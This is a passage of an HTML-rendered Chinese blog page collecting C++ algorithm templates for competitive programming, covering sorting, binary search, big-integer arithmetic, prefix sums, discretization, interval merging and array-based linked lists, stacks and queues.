class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">merge_sort</span>(q, l, mid);</span><br><span class="line">    <span class="built_in">merge_sort</span>(q, mid + <span class="number">1</span>, r);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>, i = l, j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">        <span class="keyword">if</span> (q[i] &lt;= q[j]) tmp[k ++ ] = q[i ++ ];</span><br><span class="line">        <span class="keyword">else</span> tmp[k ++ ] = q[j ++ ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = l, j = <span class="number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求逆序对数量</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_sort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="built_in">my_sort</span>(l, mid);</span><br><span class="line"><span class="built_in">my_sort</span>(mid + <span class="number">1</span>, r);</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>, i = l, j = mid + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] &lt;= a[j]) tmp[cnt++] = a[i++];</span><br><span class="line"><span class="keyword">else</span> Count += (<span class="type">long</span> <span class="type">long</span>)(mid - i + <span class="number">1</span>), tmp[cnt++] = a[j++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid) tmp[cnt++] = a[i++];</span><br><span class="line"><span class="keyword">while</span> (j &lt;= r) tmp[cnt++] = a[j++];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = l, j = <span class="number">0</span>; j &lt; cnt; i++, j++) a[i] = tmp[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二分-二分查找或二分答案">二分 (二分查找或二分答案)</h2><h3 id="整数二分">整数二分</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="comment">/* ... */</span>&#125; <span class="comment">// 检查x是否满足某种性质</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bsearch_1</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) r = mid;    <span class="comment">// check()判断mid是否满足性质</span></span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bsearch_2</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) l = mid;</span><br><span class="line">        <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="浮点数二分">浮点数二分</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">double</span> x)</span> </span>&#123;<span class="comment">/* ... */</span>&#125; <span class="comment">// 检查x是否满足某种性质</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">bsearch_3</span><span class="params">(<span class="type">double</span> l, <span class="type">double</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">double</span> eps = <span class="number">1e-6</span>;   <span class="comment">// eps 表示精度，取决于题目对精度的要求</span></span><br><span class="line">    <span class="keyword">while</span> (r - l &gt; eps)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高精度">高精度</h2><h3 id="高精度加法">高精度加法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C = A + B, A &gt;= 0, B &gt;= 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        t += A[i];</span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t += B[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">        t /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t) C.<span class="built_in">push_back</span>(t);</span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高精度减法">高精度减法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        t = A[i] - t;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t -= B[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (t &lt; <span class="number">0</span>) t = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> t = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高精度-低精度">高精度×低精度</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C = A * b, A &gt;= 0, b &gt;= 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || t; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) t += A[i] * b;</span><br><span class="line">        C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">        t /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高精度除以低精度">高精度除以低精度</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A / b = C ... r, A &gt;= 0, b &gt; 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">div</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b, <span class="type">int</span> &amp;r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">    r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )</span><br><span class="line">    &#123;</span><br><span class="line">        r = r * <span class="number">10</span> + A[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">        r %= b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="前缀和">前缀和</h2><h3 id="一维前缀和">一维前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S[i] = a[<span class="number">1</span>] + a[<span class="number">2</span>] + ... a[i]</span><br><span class="line">a[l] + ... + a[r] = S[r] - S[l - <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="二维前缀和">二维前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">s[i][j] = s[i<span class="number">-1</span>][j] + s[i][j<span class="number">-1</span>] - s[i<span class="number">-1</span>][j<span class="number">-1</span>] + a[i][j];</span><br><span class="line"><span class="comment">// 以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：</span></span><br><span class="line">S[x2, y2] - S[x1 - <span class="number">1</span>, y2] - S[x2, y1 - <span class="number">1</span>] + S[x1 - <span class="number">1</span>, y1 - <span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一维差分-前缀和的逆运算">一维差分（前缀和的逆运算）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给区间[l, r]中的每个数加上c：B[l] += c, B[r + <span class="number">1</span>] -= c</span><br></pre></td></tr></table></figure><h3 id="二维差分">二维差分</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：</span><br><span class="line">S[x1, y1] += c, S[x2 + 1, y1] -= c, S[x1, y2 + 1] -= c, S[x2 + 1, y2 + 1] += c</span><br></pre></td></tr></table></figure><h2 id="位运算">位运算</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">求n的第k位数字: n &gt;&gt; k &amp; 1 (从0位开始)</span><br><span class="line">返回n的最后一位1：lowbit(n) = n &amp; -n</span><br></pre></td></tr></table></figure><h2 id="离散化">离散化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将一些数映射到 1-n</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; alls; <span class="comment">// 存储所有待离散化的值</span></span><br><span class="line"><span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()); <span class="comment">// 将所有值排序</span></span><br><span class="line">alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());   <span class="comment">// 去掉重复元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二分求出x对应的离散化的值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> <span class="comment">// 找到第一个大于等于x的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (alls[mid] &gt;= x) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r + <span class="number">1</span>; <span class="comment">// 映射到1, 2, ...n</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间合并">区间合并</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将所有存在交集的区间合并</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;PII&gt; &amp;segs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;PII&gt; res;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(segs.<span class="built_in">begin</span>(), segs.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> st = <span class="number">-2e9</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> seg : segs)</span><br><span class="line">        <span class="keyword">if</span> (ed &lt; seg.first)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line">            st = seg.first, ed = seg.second;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> ed = <span class="built_in">max</span>(ed, seg.second);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line"></span><br><span class="line">    segs = res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据结构">数据结构</h2><h3 id="单链表-邻接表见图论">单链表（邻接表见图论）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点</span></span><br><span class="line"><span class="type">int</span> head, e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在链表头插入一个数a</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = a, ne[idx] = head, head = idx ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将头结点删除，需要保证头结点存在</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = ne[head];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双链表">双链表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点</span></span><br><span class="line"><span class="type">int</span> e[N], l[N], r[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//0是左端点，1是右端点</span></span><br><span class="line">    r[<span class="number">0</span>] = <span class="number">1</span>, l[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在节点a的右边插入一个数x</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    l[idx] = a, r[idx] = r[a];</span><br><span class="line">    l[r[a]] = idx, r[a] = idx ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除节点a</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    l[r[a]] = l[a];</span><br><span class="line">    r[l[a]] = r[a];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模拟栈">模拟栈</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tt表示栈顶</span></span><br><span class="line"><span class="type">int</span> stk[N], tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向栈顶插入一个数</span></span><br><span class="line">stk[ ++ tt] = x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从栈顶弹出一个数</span></span><br><span class="line">tt -- ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈顶的值</span></span><br><span class="line">stk[tt];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断栈是否为空，如果 tt &gt; 0，则表示不为空</span></span><br><span class="line"><span class="keyword">if</span> (tt &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模拟队列">模拟队列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、普通队列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// hh 表示队头，tt表示队尾</span></span><br><span class="line"><span class="type">int</span> q[N], hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向队尾插入一个数</span></span><br><span class="line">q[ ++ tt] = x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从队头弹出一个数</span></span><br><span class="line">hh ++ ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队头的值</span></span><br><span class="line">q[hh];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断队列是否为空，如果 hh &lt;= tt，则表示不为空</span></span><br><span class="line"><span class="keyword">if</span> (hh &lt;= tt)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、循环队列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// hh 表示队头，tt表示队尾的后一个位置</span></span><br><span class="line"><span class="type">int</span> q[N], hh = <span class="number">0</span>, tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向队尾插入一个数</span></span><br><span class="line">q[tt ++ ] = x;</span><br><span class="line"><span class="keyword">if</span> (tt == N) tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从队头弹出一个数</span></span><br><span class="line">hh ++ ;</span><br><span class="line"><span class="keyword">if</span> (hh == N) hh = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队头的值</span></span><br><span class="line">q[hh];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断队列是否为空，如果hh != tt，则表示不为空</span></span><br><span class="line"><span class="keyword">if</span> (hh != tt)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单调栈">单调栈</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 常见模型：找出滑动窗口中的最大值/最小值</span></span><br><span class="line"><span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span 